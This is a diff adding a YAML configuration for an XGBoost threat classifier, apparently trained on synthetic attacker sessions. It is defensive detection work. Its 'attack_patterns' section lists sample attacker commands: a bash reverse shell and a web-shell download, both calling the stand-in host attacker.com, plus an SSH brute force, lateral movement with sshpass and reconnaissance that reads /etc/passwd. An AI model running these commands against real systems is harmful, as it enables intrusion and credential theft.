@@ -1,0 +1,148 @@
+# ML Model Configuration
+model:
+  name: "threat_classifier"
+  type: "xgboost"
+  version: "1.0.0"
+  
+  # Model hyperparameters
+  params:
+    objective: "multi:softmax"
+    num_class: 3
+    max_depth: 6
+    learning_rate: 0.1
+    n_estimators: 100
+    subsample: 0.8
+    colsample_bytree: 0.8
+    random_state: 42
+    eval_metric: "mlogloss"
+  
+  # Training configuration
+  training:
+    test_size: 0.2
+    random_state: 42
+    n_jobs: -1
+    early_stopping_rounds: 10
+    verbose: 1
+  
+  # Model persistence
+  model_dir: "models"
+  model_file: "threat_classifier.joblib"
+  feature_importance_plot: true
+  
+# Feature Engineering
+feature_engineering:
+  # Feature selection
+  numeric_features:
+    - "duration"
+    - "bytes_sent"
+    - "bytes_received"
+    - "num_commands"
+    - "unique_commands"
+    - "failed_attempts"
+    - "session_length"
+  
+  categorical_features:
+    - "username_pattern"
+    - "command_pattern"
+    - "time_of_day"
+    - "day_of_week"
+  
+  # Feature transformations
+  scale_numeric: true
+  encode_categorical: true
+  max_categories: 100
+
+# Data Collection
+data_collection:
+  # Data directories
+  raw_data_dir: "data/raw"
+  processed_data_dir: "data/processed"
+  
+  # Data generation
+  num_samples: 10000  # Total samples to generate
+  
+  # Data splits
+  train_ratio: 0.7
+  val_ratio: 0.15
+  test_ratio: 0.15
+
+# Attack Patterns
+attack_patterns:
+  scanner:
+    - name: "port_scan"
+      command: "nmap -sS -p 1-1024"
+      description: "Basic port scanning"
+    - name: "service_scan"
+      command: "nmap -sV -T4"
+      description: "Service version detection"
+    - name: "os_scan"
+      command: "nmap -O -T4"
+      description: "OS detection scan"
+  
+  amateur:
+    - name: "brute_force_ssh"
+      command: "hydra -l root -P passlist.txt ssh://target"
+      description: "SSH brute force attack"
+    - name: "default_creds"
+      command: "ssh root@target"
+      description: "Default credential attempts"
+    - name: "web_shell_upload"
+      command: "wget http://attacker.com/shell.php -O /var/www/html/shell.php"
+      description: "Web shell upload attempt"
+  
+  advanced:
+    - name: "reverse_shell"
+      command: "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+      description: "Reverse shell attempt"
+    - name: "privilege_escalation"
+      command: "sudo -l; cat /etc/passwd; find / -perm -4000 2>/dev/null"
+      description: "Privilege escalation attempt"
+    - name: "lateral_movement"
+      command: "sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@internal-host"
+      description: "Lateral movement attempt"
+
+# Monitoring & Logging
+monitoring:
+  # Logging
+  log_level: "INFO"
+  log_file: "logs/training.log"
+  
+  # Model performance tracking
+  track_metrics: true
+  metrics_file: "logs/metrics.json"
+  
+  # Experiment tracking
+  experiment_name: "threat_classification"
+  experiment_dir: "experiments"
+
+# Evaluation
+evaluation:
+  # Classification metrics
+  metrics:
+    - "accuracy"
+    - "precision_macro"
+    - "recall_macro"
+    - "f1_macro"
+    - "confusion_matrix"
+  
+  # Cross-validation
+  cv_folds: 5
+  
+  # Thresholds
+  min_accuracy: 0.85
+  min_precision: 0.8
+  min_recall: 0.8
+
+# Deployment
+deployment:
+  # Model serving
+  api_endpoint: "http://localhost:5000/predict"
+  batch_size: 32
+  
+  # Model monitoring
+  monitor_drift: true
+  drift_threshold: 0.15
+  
+  # Retraining
+  retrain_interval: 30  # days
+  min_retrain_samples: 1000
